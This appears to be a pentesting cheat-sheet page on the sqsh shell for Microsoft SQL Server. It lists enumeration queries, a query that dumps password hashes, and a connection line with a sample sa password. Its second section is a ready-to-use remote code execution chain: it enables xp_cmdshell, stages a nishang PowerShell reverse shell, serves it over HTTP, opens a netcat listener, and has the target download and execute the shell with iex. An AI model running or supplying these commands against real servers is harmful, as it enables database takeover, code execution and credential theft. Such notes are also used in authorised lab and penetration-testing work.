---
description: sqsh - Interactive database shell
---

# sqsh

### sqsh common commands

{% code overflow="wrap" %}
```bash
# Connection
sqsh -S 10.10.10.143 -U username -P password
sqsh -S 10.11.1.31 -U sa -P poiuytrewq

# Check version
1> select @@version
2> go

# Check current user
1> select suser_sname()
2> go

# Check database names
1>SELECT name FROM master..sysdatabases
2>go
1>SELECT name FROM master.dbo.sysdatabases
2>go

# Check table names
1>SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES
  SELECT * FROM master.INFORMATION_SCHEMA.TABLES  # master database
2>go
1>SELECT name FROM master..sysobjects WHERE xtype = 'U'
2>go

# Check column names
1>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'table_name')
2>go

# Extract data
1>SELECT colum_name_1 FROM table_name1
2>go

# Check hte users with sysadmin rights
1>select loginname from syslogins where sysadmin = 1
2>go

# Extract password hash
1>select name, password_hash from master.sys.sql_logins
2>go
```
{% endcode %}

### sqsh RCE commands

{% code overflow="wrap" %}
```bash
# Check if you can run now
1>xp_cmdshell 'whoami'
2>go

# If above does not work, run the command below.
1> EXEC SP_CONFIGURE 'show advanced options',1
2> reconfigure
3> go
1> EXEC SP_CONFIGURE 'xp_cmdshell',1
2> reconfigure
3> go

# Run the commands 
1>xp_cmdshell 'dir C:\'
2>go

# nishang reverse shell execution
(Kali T1) cp /opt/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 .
(Kali T1) mv Invoke-PowerShellTcp.ps1 shell.ps1
 
#Add the following at the end of shell.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.142.141 -Port 1234

(Kali T2) sudo python3 -m http.server 80
(Kali T3) nc -nvlp 1234
	
(Target) 1>xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://192.168.142.141/shell.ps1')"
(Target) 2>go

(Kali T3) cmd /c "systeminfo"

```
{% endcode %}

### [sqsh Responder](responder.md)

Check sqsh Responder commands section.&#x20;

###
